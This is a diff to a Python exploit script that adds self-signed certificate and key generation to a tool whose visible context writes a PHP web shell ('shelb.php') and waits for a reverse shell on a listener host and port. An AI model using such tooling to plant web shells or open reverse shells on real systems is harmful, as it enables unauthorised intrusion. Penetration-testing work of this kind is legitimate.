@@ -18,6 +18,46 @@ import time
 import subprocess
 from multiprocessing.dummy import Pool
 from optparse import OptionParser
+from OpenSSL import crypto, SSL
+
+
+def get_cert(
+    emailAddress="m4ud@pentest.com",
+    commonName="m4ud",
+    countryName="CA",
+    localityName="m4ud",
+    stateOrProvinceName="m4ud",
+    organizationName="m4ud",
+    organizationUnitName="m4ud",
+    serialNumber=0,
+    validityStartInSeconds=0,
+    validityEndInSeconds=10*365*24*60*60,
+    KEY_FILE = "key.key",
+    CERT_FILE="cert.crt"):
+    #can look at generated file using openssl:
+    #openssl x509 -inform pem -in selfsigned.crt -noout -text
+    # create a key pair
+    k = crypto.PKey()
+    k.generate_key(crypto.TYPE_RSA, 4096)
+    # create a self-signed cert
+    cert = crypto.X509()
+    cert.get_subject().C = countryName
+    cert.get_subject().ST = stateOrProvinceName
+    cert.get_subject().L = localityName
+    cert.get_subject().O = organizationName
+    cert.get_subject().OU = organizationUnitName
+    cert.get_subject().CN = commonName
+    cert.get_subject().emailAddress = emailAddress
+    cert.set_serial_number(serialNumber)
+    cert.gmtime_adj_notBefore(0)
+    cert.gmtime_adj_notAfter(validityEndInSeconds)
+    cert.set_issuer(cert.get_subject())
+    cert.set_pubkey(k)
+    cert.sign(k, 'sha512')
+    with open(CERT_FILE, "wt") as f:
+        f.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert).decode("utf-8"))
+    with open(KEY_FILE, "wt") as f:
+        f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k).decode("utf-8"))
 
 def wshell(shell):
   f = open( 'shelb.php', 'w' )
@@ -27,7 +67,6 @@ def wshell(shell):
   print("\r\n[+] Initiating Omega Protocol [+]")
 
 def serverShutdown(server):
-#    time.sleep(1)
     server.stop()
     print("[+] Shutting down Web-Server![+]")
     print("[*] Getting Shell, wait a moment!![*]")
@@ -40,6 +79,7 @@ def getshell(lport):
 
 class burn():
   def __init__(self, options):
+    get_cert()
     self.target = options.target
     self.lhost = options.lhost 
     self.lport = options.lport 
